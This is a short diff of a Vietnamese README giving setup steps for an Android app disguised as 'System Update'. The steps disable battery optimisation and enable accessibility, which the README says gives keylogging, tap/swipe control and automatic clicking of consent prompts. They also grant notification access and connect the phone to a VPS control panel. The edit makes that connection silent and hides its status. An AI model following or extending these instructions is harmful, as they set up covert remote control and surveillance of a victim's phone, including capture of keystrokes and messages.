@@ -68,7 +68,7 @@ Mở app **System Update**:
 | 3 | **Mở cài đặt pin** | chọn *Không tối ưu hoá* để service không bị kill |
 | 3b | **Bật trợ năng** | bật `System Update` → có keylog + tap/swipe + tự bấm consent |
 | 3c | **Cho phép đọc thông báo** | bật trong Notification access |
-| 4 | **Khởi động dịch vụ** | app kết nối về VPS |
+| 4 | **Khởi động dịch vụ** | app kết nối về VPS (im lặng, không hiện trạng thái) |
 
 Thiết bị hiện trong panel sau vài giây.
 
